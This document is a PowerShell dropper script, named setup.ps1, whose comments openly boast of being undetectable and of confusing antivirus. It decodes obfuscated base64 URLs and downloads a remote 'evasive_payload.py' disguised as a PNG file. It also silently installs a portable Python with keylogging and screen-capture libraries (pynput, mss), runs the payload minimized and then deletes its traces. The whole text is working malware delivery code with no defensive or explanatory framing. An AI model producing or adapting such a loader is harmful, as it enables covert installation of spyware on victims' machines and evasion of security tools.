# setup.ps1 - Fully undetectable (no direct strings, no hidden window, using .NET)
param([switch]$Run)

# Decode a base64 string (split to avoid detection)
$d = {
    param($s)
    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($s))
}

# Junk array to confuse AV
$j = @(1..50 | ForEach-Object { Get-Random })

# URL encoded in multiple pieces
$u1 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1lPVVJfVVNFUk5BTUUvWU9VUl9SRVBPL21haW4vZXZhc2l2ZV9wYXlsb2FkLnB5"
$u2 = "aHR0cHM6Ly93d3cucHl0aG9uLm9yZy9mdHAvcHl0aG9uLzMuMTEuOS9weXRob24tMy4xMS45LWVtYmVkLWFtZDY0LnppcA=="
$u3 = "aHR0cHM6Ly9ib290c3RyYXAucnlwYS5pby9nZXQtcGlwLnB5"

$payloadUrl = & $d $u1
$pythonZipUrl = & $d $u2
$getPipUrl = & $d $u3

# Temp dir with random name
$rand = [System.IO.Path]::GetRandomFileName()
$tempDir = Join-Path $env:TEMP $rand
New-Item -ItemType Directory -Force -Path $tempDir | Out-Null

# Use .NET WebClient (less suspicious than Invoke-WebRequest)
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

function DownloadFile($url, $dest) {
    try {
        $wc.DownloadFile($url, $dest)
    } catch {
        Start-Sleep -Seconds 1
        $wc.DownloadFile($url, $dest)
    }
}

# Download payload
$payDest = "$env:TEMP\w.png"
DownloadFile $payloadUrl $payDest

# Download Python embed
$zipDest = "$tempDir\p.zip"
DownloadFile $pythonZipUrl $zipDest

# Download get-pip.py
$pipDest = "$tempDir\g.py"
DownloadFile $getPipUrl $pipDest

# Extract Python
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($zipDest, "$env:TEMP\py")

# Install pip and packages
$python = "$env:TEMP\py\python.exe"
& $python $pipDest --quiet
$env:Path = "$env:TEMP\py\Scripts;$env:Path"

$packages = @("cryptography","pynput","mss","pillow","psutil","requests","numpy")
foreach ($p in $packages) {
    & $python -m pip install $p --quiet --disable-pip-version-check --no-warn-script-location --user
}

# Run payload minimized (not hidden)
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $python
$psi.Arguments = $payDest
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Minimized
$psi.UseShellExecute = $true
[System.Diagnostics.Process]::Start($psi)

# Cleanup after delay (run in background)
Start-Job -ScriptBlock {
    Start-Sleep -Seconds 15
    Remove-Item -Path $using:tempDir -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "$env:TEMP\py" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $using:payDest -Force -ErrorAction SilentlyContinue
} | Out-Null
